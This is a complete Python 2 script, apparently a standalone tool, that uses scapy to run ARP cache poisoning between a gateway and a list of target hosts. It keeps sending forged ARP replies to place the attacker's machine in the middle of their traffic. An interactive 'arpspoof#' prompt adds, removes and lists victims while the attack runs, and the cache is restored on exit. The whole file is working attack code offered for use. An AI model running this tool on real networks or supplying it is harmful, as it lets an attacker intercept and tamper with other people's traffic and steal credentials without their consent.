#!/usr/bin/env python2
import sys
import argparse
import threading
import Queue
import time
from scapy.all import *

# index values into tuples
IP = CMD = 0
MAC = TARGET = 1


def parse_args():
    parser = argparse.ArgumentParser(description='Do ARP poisoning between ' +
                                                 'a gatway and several ' +
                                                 'targets')
    parser.add_argument('-i', '--interface', dest='interface',
                        help='interface to send from')
    parser.add_argument('-t', '--targets', dest='targets',
                        help='comma-separated list of IP addresses',
                        required=True)
    parser.add_argument('-g', '--gateway', dest='gateway',
                        help='IP address of the gateway', required=True)
    return parser.parse_args()


def get_MAC(interface, target_IP):
    # get the MAC address of target_IP and return it

    source_IP = get_if_addr(interface)
    source_MAC = get_if_hwaddr(interface)
    p = ARP(hwsrc=source_MAC, psrc=source_IP)  # ARP request by default
    p.hwdst = 'ff:ff:ff:ff:ff:ff'
    p.pdst = target_IP
    reply, unans = sr(p, timeout=5, verbose=0)
    if len(unans) > 0:
        # received no reply
        raise Exception('Error finding MAC for %s, try using -i' % target_IP)
    return reply[0][1].hwsrc


def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
    finish = False
    # the control queue is used to send commands to the poison thread
    # as soon as the thread finds the queue not empty, it will stop poisoning
    # and evaluate the item in the queue. It will process the command and then
    # either continue poisoning or finish its execution
    while not finish:
        # as long as no elements are in the queue, we will send ARP messages
        while control_queue.empty():
            for t in targets:
                send_ARP(t[IP], t[MAC], gateway[IP], attacker_MAC)
                send_ARP(gateway[IP], gateway[MAC], t[IP], attacker_MAC)
            time.sleep(1)

        # queue not empty, pull the element out of the queue to empty it again
        try:
            # item is a 2-element tuple (command, (IP, MAC))
            # item[CMD] = command, item[TARGET] = (IP, MAC)
            item = control_queue.get(block=False)
        except Empty:
            # The Empty exception is thrown when there is no element in the
            # queue. Something clearly is not working as it should...
            print 'Something broke, your queue idea sucks.'

        cmd = item[CMD].lower()
        if cmd in ['quit', 'exit', 'stop', 'leave']:
            # command to terminate the thread received
            finish = True

        elif cmd in ['add', 'insert']:
            targets.append(item[TARGET])

        elif cmd in ['del', 'delete', 'remove']:
            try:
                targets.remove(item[TARGET])
                restore_ARP_caches([item[TARGET]], gateway, False)
            except ValueError:
                print "%s not in target list" % item[TARGET][0]

        elif cmd in ['list', 'show', 'status']:
            print 'Current targets:'
            print 'Gateway: %s (%s)' % gateway
            for t in targets:
                print "%s (%s)" % t
    # we are done, reset every host
    restore_ARP_caches(targets, gateway)


def restore_ARP_caches(targets, gateway, verbose=True):
    # send correct ARP responses to the targets and the gateway
    print 'Stopping the attack, restoring ARP cache'
    for i in xrange(3):
        if verbose:
            print "ARP %s is at %s" % (gateway[IP], gateway[MAC])
        for t in targets:
            if verbose:
                print "ARP %s is at %s" % (t[IP], t[MAC])
            send_ARP(t[IP], t[MAC], gateway[IP], gateway[MAC])
            send_ARP(gateway[IP], gateway[MAC], t[IP], t[MAC])
        time.sleep(1)
    print 'Restored ARP caches'


def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
    # op=2 is ARP response
    # psrc/hwsrc is the data we want the destination to have
    arp_packet = ARP(op=2, pdst=destination_IP, hwdst=destination_MAC,
                     psrc=source_IP, hwsrc=source_MAC)
    send(arp_packet, verbose=0)


def main():
    args = parse_args()
    control_queue = Queue.Queue()

    # use supplied interface or let scapy choose one
    interface = args.interface or get_working_if()
    attacker_MAC = get_if_hwaddr(interface)

    print 'Using interface %s (%s)' % (interface, attacker_MAC)
    try:
        # args.targets should be a comma-separated string of IP-Adresses
        # -t 10.1.1.2,10.1.1.32,10.1.1.45
        # targets is a list of (IP, MAC) tuples
        targets = [(t.strip(), get_MAC(interface, t.strip())) for t in
                   args.targets.split(',')]
    except Exception, e:
        # Exception most likely because get_MAC failed, check if -t or -g are
        # actually valid IP addresses
        print e.message
        sys.exit(1)

    # same as above, gateway is a (IP, MAC) tuple
    try:
        # args.gateway is a single IP address
        gateway = (args.gateway, get_MAC(interface, args.gateway))
    except Exception, e:
        print e.message
        sys.exit(2)

    # create and start the poison thread
    poison_thread = threading.Thread(target=start_poison_thread,
                                     args=(targets, gateway, control_queue,
                                           attacker_MAC))
    poison_thread.start()

    try:
        while poison_thread.is_alive():
            time.sleep(1)  # delay is a quick hack to kind of sync output
                           # w/o this, the thread output messes up the prompt
                           # TODO: think of something a little less ugly
            command = raw_input('arpspoof# ').split()
            if command:
                cmd = command[CMD].lower()
                if cmd in ['help', '?']:
                    print "add <IP>: add IP address to target list\n" + \
                          "del <IP>: remove IP address from target list\n" + \
                          "list: print all current targets\n" + \
                          "exit: stop poisoning and exit"

                elif cmd in ['quit', 'exit', 'stop', 'leave']:
                    control_queue.put(('quit',))
                    poison_thread.join()

                elif cmd in ['add', 'insert', 'del', 'delete', 'remove']:
                    ip = command[TARGET]
                    print "IP: " + ip
                    try:
                        t = (ip, get_MAC(interface, ip))
                        control_queue.put((cmd, t))
                    except Exception, e:
                        print 'Can not add %s' % IP
                        print e.message

                elif cmd in ['list', 'show', 'status']:
                    control_queue.put((cmd,))

    except KeyboardInterrupt:
        # Ctrl+C detected, so let's finish the poison thread and exit
        control_queue.put(('quit',))
        poison_thread.join()

if __name__ == '__main__':
    main()
